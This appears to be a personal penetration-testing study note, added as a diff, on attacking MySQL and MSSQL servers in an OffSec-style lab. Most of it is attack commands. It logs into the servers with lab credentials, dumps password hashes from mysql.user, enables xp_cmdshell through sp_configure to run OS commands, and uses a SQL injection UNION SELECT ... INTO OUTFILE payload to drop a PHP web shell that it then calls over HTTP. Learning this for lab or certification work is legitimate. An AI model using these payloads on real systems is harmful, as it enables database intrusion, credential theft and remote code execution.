@@ -1,0 +1,44 @@
+# Attacks
+- MySQL
+	- mysql -u root -p 'root' -h 192.168.50.16 -P 3306
+		- version();
+		- select system_user();
+		- show databases;
+		- SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+- MSSQL (windows)
+	- SQLCMD
+		- allows SQL commands through windows cmd or remotely
+	- [[Impacket]]
+		- python framework
+		- supports TDS (MSSQL)
+			- impacket-mssqlclient
+		- Example:
+			1. impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+				- -windows-auth forces NTLM over Kerberos
+			2.  SELECT @@version;
+			- If not using MSSQL TDS protocol, sqlcmd requires GO on seperate line
+			3. SELECT name FROM sys.databases;
+			4. select * FROM offsec.information_schema.tables;
+			5. select * from offsec.dbo.users;
+
+### Manual Code Execution
+- [[Impacket]]
+	1.  impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+	2. EXECUTE sp_configure 'show advanced options', 1;
+		- Enabling advanced options
+	1. RECONFIGURE;
+		- Apply configuration
+	2. EXECUTE sp_configure 'xp_cmdshell', 1;
+		- Enabling xp_cmdshell
+	3. RECONFIGURE;
+	4. Test
+		- EXECUTE xp_cmdshell 'whoami';
+
+- SELECT INTO_OUTFILE
+	- Can be abused for RCE
+	1. UNION SELECT to include PHP line into the first column and save it as webshell.php
+		- ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+		- File will include
+			- <? system($_REQUEST['cmd']); ?>
+	 2. http://192.169.120.19/tmp/webshell.php?cmd=id
+#impacket-mssqlclient #mssql
